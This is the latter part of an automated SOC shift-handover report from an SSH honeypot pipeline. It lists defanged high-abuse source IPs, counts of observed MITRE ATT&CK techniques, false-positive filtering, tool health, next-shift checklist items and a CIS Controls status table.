| `47.112.110[.]110` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 5 |
| `139.198.29[.]172` | CN | Yunify Technologies Inc. | **100** ⚠️ | 21 |
| `152.32.163[.]183` | VN | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `123.139.242[.]2` | CN | China Unicom Shannxi province network | **100** ⚠️ | 3 |
| `14.153.7[.]81` | CN | CHINANET Guangdong province network | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 212 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 181 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 27 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 24 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 22 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 24 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 336 cases |
| Tool 34  | Credential Extractor        | ✅ 205 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 12 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 98 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (15.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 157 priority case(s) shown individually · 57 recon entry/entries in table (26 group(s) consolidating 97 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-09T19:10:46Z_
